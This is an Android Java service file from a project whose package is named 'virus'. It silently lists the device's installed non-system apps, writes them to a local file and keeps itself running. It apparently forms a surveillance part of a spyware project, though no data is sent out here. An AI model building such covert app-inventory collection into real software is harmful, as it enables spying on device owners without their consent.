package com.example.virus.Services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.IBinder;

import java.io.IOException;
import java.io.PrintWriter;
import java.util.List;

public class AppInfoService extends Service {
    public AppInfoService() {
    }


    @Override
    public void onCreate()
    {

    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        return null;
      //  throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        dumpApp(this);
        return Service.START_STICKY;
    }



   public void  dumpApp(Context context) {
        String appsFile = context.getApplicationInfo().dataDir + "/apps";

        final PackageManager pm = context.getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        try {

            PrintWriter pw= new PrintWriter(appsFile);

            for (ApplicationInfo packageInfo : packages) {
                if (!isSystemPackage(packageInfo))

                    pw.write(pm.getApplicationLabel(packageInfo) + ": " + packageInfo.packageName);
            }

            pw.close();
        } catch (IOException e) {}
    }

    private boolean isSystemPackage(ApplicationInfo applicationInfo) {
        return ((applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
    }
}
